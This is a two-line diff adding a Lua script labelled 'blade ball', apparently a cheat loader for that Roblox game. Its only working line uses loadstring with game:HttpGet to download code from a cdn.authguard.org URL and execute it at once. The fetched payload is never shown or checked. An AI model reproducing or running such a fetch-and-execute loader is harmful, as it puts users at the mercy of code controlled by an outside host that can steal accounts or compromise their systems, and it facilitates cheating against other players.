@@ -1,0 +1,2 @@
+-- blade ball
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/7d7c631a43a64b88b171e57a65910f65"))()
